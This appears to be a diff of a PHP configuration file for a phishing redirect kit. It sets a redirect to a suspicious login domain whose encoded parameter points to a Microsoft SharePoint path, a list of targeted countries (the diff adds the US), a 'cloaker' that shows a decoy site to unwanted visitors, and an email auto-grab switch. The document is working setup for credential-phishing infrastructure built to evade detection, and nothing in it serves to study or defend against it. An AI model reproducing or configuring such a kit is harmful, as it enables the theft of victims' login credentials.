@@ -14,7 +14,7 @@
 
 $license_key = "ks6zv5u0jn3sivn0ts5ej2hti9yaj8pj"; // [REQUIRED]
 
-$redirect = "https://zsacou.rfipepogdjql.es/v3Rrmoz7o@C9CS/$"; // URL or FILE [REQUIRED]
+$redirect = "https://login.egiblucielofage.info/?ce-U-OsHAN0=aHR0cHM6Ly9taWNyb3NvZnQuc2hhcmVwb2ludC5jb20vOng6L3IvdGVhbXMvKipURUFN"; // URL or FILE [REQUIRED]
 
 
 $parameter = 1; // [REQUIRED]
@@ -26,14 +26,14 @@ $parameter = 1; // [REQUIRED]
 	4 : Allow All Visitors.
 */
 
-$_COUNTRY_ALLOWED = ["ma", "fr", "ca", "mx", "uk", "za", "tr", "at", "be", "bg", "hr", "cy", "cz", "dk", "ee", "fl", "fr", "de", "gr", "hu", "ie", "it", "lv", "lt", "lu", "mt", "nl", "pl", "pt", "ro", "sk", "sl", "es", "se", "is", "li", "no", "ch", "al", "ba", "md", "me", "mk", "rs", "ua", "ad", "by", "mc", "ru", "sm", "gb", "va", "kw"]; # Add Allowed Country Here , Country ISO code must be lowercase. [REQUIRED]
+$_COUNTRY_ALLOWED = ["us", "fr", "ca", "mx", "uk", "za", "tr", "at", "be", "bg", "hr", "cy", "cz", "dk", "ee", "fl", "fr", "de", "gr", "hu", "ie", "it", "lv", "lt", "lu", "mt", "nl", "pl", "pt", "ro", "sk", "sl", "es", "se", "is", "li", "no", "ch", "al", "ba", "md", "me", "mk", "rs", "ua", "ad", "by", "mc", "ru", "sm", "gb", "va", "kw"]; # Add Allowed Country Here , Country ISO code must be lowercase. [REQUIRED]
 
 $redirection_link_check = false; // Check Your Page If Still Uploaded
 
 $check_red_page = False; // Check The Redirect If Red Flag
 
 $cloaker = [
-    "url_to_grab" => "https://kunststo.transportwielen.shop/access", // Change the link you want to grap it in your link ( if t)
+    "url_to_grab" => "https://www.worldometers.info", // Change the link you want to grap it in your link ( if t)
 ];
 
 $auto_grabber = true; // Activate Auto Grab Email
